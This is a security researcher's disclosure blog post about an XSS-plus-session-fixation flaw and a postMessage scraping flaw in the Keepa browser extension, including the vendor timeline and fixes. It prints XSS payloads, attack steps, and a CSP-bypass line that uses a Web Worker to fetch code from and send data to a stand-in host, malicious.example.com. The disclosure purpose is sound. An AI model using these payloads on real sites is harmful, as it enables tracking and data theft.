---
title: "Abusing Keepa Price Tracker to track users on Amazon pages"
date: 2021-10-05T12:31:12+0200
description: Two critical vulnerabilities affected users of the Keepa extension, exposing them to tracking of their Amazon shopping and even data leaks.
categories:
- security
- privacy
- keepa
- add-ons
---

As we’ve [seen before](/2020/10/28/what-would-you-risk-for-free-honey/), shopping assistants usually aren’t a good choice of browser add-on if you value either your privacy or security. This impression is further reinforced by Keepa, the Amazon Price Tracker. The good news here: the scope of this extension is limited to Amazon properties. But that’s all the good news there are. I’ve already written about [excessive data collection practices](/2021/08/02/data-exfiltration-in-keepa-price-tracker/) in this extension. I also reported two security vulnerabilities to the vendor.

Today we’ll look at a persistent [Cross-Site Scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerability in the Keepa Box. This one allowed any attackers to track you across Amazon web properties. The second vulnerability exposed Keepa’s scraping functionality to third parties and could result in data leaks.

{{< img src="keepa.png" width="600" alt="Meat grinder with the Keepa logo on its side is working on the Amazon logo, producing lots of prices and stars" >}}
<em>
  Image credits:
  <a href="https://keepa.com/" rel="nofollow">Keepa</a>,
  <a href="https://openclipart.org/detail/29021/meat-mincing-machine" rel="nofollow">palomaironique</a>,
  <a href="https://de.wikipedia.org/wiki/Datei:Amazon_logo.svg" rel="nofollow">Nikon1803</a>
</em>
{{< /img >}}

{{< toc >}}

## Persistent XSS vulnerability

### What is the Keepa Box?

When you open an Amazon product page, the Keepa extension will automatically inject a frame like [https://keepa.com/iframe_addon.html#3-0-B07FCMBLV6](https://keepa.com/iframe_addon.html#3-0-B07FCMBLV6) into it. Initially, it shows you a price history for the article, but there is far more functionality here.

{{< img src="keepabox.png" width="743" alt="Complicated graph showing the price history of an Amazon article, with several knops to tweak the presentation as well as several other options such as logging in." />}}

This page, called the Keepa Box, is mostly independent of the extension. Whether the extension is present or not, it lets you look at the data, log into an account and set alerts. The extension merely assists it by handling some messages, more on that below.

### Injecting HTML code

The JavaScript code powering the Keepa Box is based on jQuery, security-wise a [very questionable choice of framework](/2020/03/02/psa-jquery-is-bad-for-the-security-of-your-project/). As common with jQuery-based projects, this one will compose HTML code from strings. And it doesn’t bother properly escaping special characters, so there are plenty of potential HTML injection points. For example this one:

{{< highlight js >}}
html = storage.username ?
          "<span id=\"keepaBoxSettings\">" + storage.username + "</span>" :
          "<span id=\"keepaBoxLogin\">" + la._9 + "</span>";
{{< /highlight >}}

If the user is logged in, the user name as set in `storage.username` will be displayed. So a malicious user name like `me<img src=x onerror=alert(1)>` will inject additional JavaScript code into the page (here displaying a message). While it doesn’t seem possible to change the user name retroactively, it was possible to register an account with a user name like this one.

Now this page is using the [Content Security Policy mechanism](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) which could have prevented the attack. But let’s have a look at the `script-src` directive:

    script-src 'self' 'unsafe-inline' https://*.keepa.com https://apis.google.com
        https://*.stripe.com https://*.googleapis.com https://www.google.com/recaptcha/
        https://www.gstatic.com/recaptcha/ https://completion.amazon.com
        https://completion.amazon.co.uk https://completion.amazon.de
        https://completion.amazon.fr https://completion.amazon.co.jp
        https://completion.amazon.ca https://completion.amazon.cn
        https://completion.amazon.it https://completion.amazon.es
        https://completion.amazon.in https://completion.amazon.nl
        https://completion.amazon.com.mx https://completion.amazon.com.au
        https://completion.amazon.com.br;

That’s lots of different websites, some of which might allow circumventing the protection. But the `'unsafe-inline'` keyword makes complicated approaches unnecessary, inline scripts are allowed. Already the simple attack above works.

### Deploying session fixation

You probably noticed that the attack described above relies on you choosing a malicious user name and logging into that account. So far this is merely so-called Self-XSS: the only person you can attack is yourself. Usually this isn’t considered an exploitable vulnerability.

This changes however if you can automatically log other people into your account. Then you can create a malicious account in advance, after which you make sure your target is logged into it. Typically, this is done via a [session fixation attack](https://en.wikipedia.org/wiki/Session_fixation).

On the Keepa website, the session is determined by a 64 byte alphanumeric token. In the JavaScript code, this token is exposed as `storage.token`. And the login procedure involves redirecting the user to an address like `https://keepa.com/#!r/4ieloesi0duftpa385nhql1hjlo4dcof86aecsr7r8est7288p9ge2m05fvbnoih` which will store `4ieloesi0duftpa385nhql1hjlo4dcof86aecsr7r8est7288p9ge2m05fvbnoih` as the current session token.

So the complete attack would look like this:

* Register an account with a malicious user name like `me<img src=x onerror=alert(1)>`
* Check the value of `storage.token` to extract the session token
* If a Keepa user visits your website, make sure to open `https://keepa.com/#!r/<token>` in a pop-up window (can be closed immediately afterwards)

Your JavaScript code (here `alert(1)`) will be injected into each and every Keepa Box of this user now. As the Keepa session is persistent, it will survive browser restarts. And it will even run on the main Keepa website if the user logs out, giving you a chance to prevent them from breaking out of the session fixation.

Keepa addressed this vulnerability by forbidding angled brackets in user names. The application still contains plenty of potentially exploitable HTML injection points, Content Security Policy hasn’t been changed either. The session fixation attack is also still possible.

### The impact

The most obvious consequence of this vulnerability: the malicious code can track all Amazon products that the user looks at. And then it can send messages that the Keepa extension will react to. These are mostly unspectacular except for two:

* `ping`: retrieves the full address of the Amazon page, providing additional information beyond the mere article ID
* `openPage`: opens a Private Browsing / Incognito window with a given page address (seems to be unused by Keepa Box code but can be abused by malicious code nevertheless)

So the main danger here is that some third party will be able to spy on the users whenever they go to Amazon. But for that it needs to inject considerable amounts of code, and it needs to be able to send data back. With user names being at most 100 characters long, and with Keepa using a fairly restrictive Content Security Policy: is it even possible?

Usually, the approach would be to download additional JavaScript code from the attacker’s web server. However, Keepa’s Content Security Policy mentioned above only allows external scripts from a few domains. Any additional scripts still have to be inserted as inline scripts.

Most other Content Security Policy directives are similarly restrictive and don’t allow connections to arbitrary web servers. The only notable exception is `worker-src`:

    worker-src 'self' blob: data: *;

No restrictions here for some reason, so the malicious user name could be something like:

{{< highlight html >}}
<img
  src=x
  onerror="new Worker('//malicious.example.com').onmessage=e=>document.write(e.data)">
{{< /highlight >}}

This will create a [Web Worker](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API) with the script downloaded from `malicious.example.com`. Same-origin policy won’t prevent it from running if the right [CORS headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) are set. And then it will wait for HTML code to be sent by the worker script. The HTML code will be added to the document via `document.write()` and can execute further JavaScript code, this time without any length limits.

The same loophole in the Content Security Policy can be used to send exfiltrated data to an external server: `new Worker("//malicious.example.com?" + encodeURLComponent(data))` will be able to send data out.

## Data exposure vulnerability

My previous article on Keepa already looked into Keepa’s scraping functionality, in particular how [Keepa loads Amazon pages in background](/2021/08/02/data-exfiltration-in-keepa-price-tracker/#extension-getting-active-on-its-own) to extract data from them. When a page loads, Keepa tells its content script which scraping filters to use. This isn’t done via inherently secure extension communication APIs but rather via [window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage). The handling in the content script essentially looks as follows:

{{< highlight js >}}
window.addEventListener("message", function (event) {
  if (event.source == window.parent && event.data) {
    var instructions = event.data.value;
    if ("data" == event.data.key && instructions.url == document.location) {
      scrape(instructions, function (scrapeResult) {
        window.parent.postMessage({ sandbox: scrapeResult }, "*");
      });
    }
  }
}, false);
{{< /highlight >}}

This will accept scraping instructions from the parent frame, regardless of whether the parent frame belongs to the extension or not. The content script will perform the scraping, potentially extracting security tokens or private information, and send the results back to its parent frame.

A malicious website could abuse this by loading a third-party page in a frame, then triggering the scraping functionality to extract arbitrary data from it, something that same-origin policy normally prevents. The catch: the content script is only active on Amazon properties and Keepa’s own website. And luckily most Amazon pages with sensitive data don’t allow framing by third parties.

Keepa’s website on the other hand is lacking such security precautions. So my proof-of-concept page would extract data from the Keepa forum if you were logged into it: your user name, email address, number of messages and whether you are a privileged user. Extracting private messages or any private data available to admins would have been easy as well. All that without any user interaction and without any user-visible effects.

This vulnerability has been addressed in Keepa 3.88 by checking the message origin. Only messages originating from an extension page are accepted now, messages from websites will be ignored.

## Conclusions

Keepa’s reliance on jQuery makes it susceptible to XSS vulnerabilities, with the one described above being only one out of many potential vulnerabilities. While the website itself probably isn’t a worthwhile target, persistent XSS vulnerabilities in Keepa Box expose users to tracking by arbitrary websites. This tracking is limited to shopping on Amazon websites but will expose much potentially private information for the typical Keepa user.

Unlike most websites, Keepa deployed a Content Security Policy that isn’t useless. By closing the remaining loopholes, attacks like the one presented here could be made impossible or at least considerably more difficult. To date, the vulnerability has been addressed minimally however and the holes in the Content Security Policy remain.

Keepa exposing its scraping functionality to arbitrary websites could have had severe impact. With any website being able to extract security tokens this way, impersonating the user towards Amazon would have been possible. Luckily, security measures on Amazon’s side prevented this scenario. Nevertheless, this vulnerability was very concerning. The fact that the extension still doesn’t use inherently secure communication channels for this functionality doesn’t make it better.

## Timeline

* 2021-07-07: Reported the vulnerabilities to the vendor via email (no response and no further communication)
* 2021-09-15: Keepa 3.88 released, fixing data exposure vulnerability
* 2021-10-04: Published article (90 days deadline)
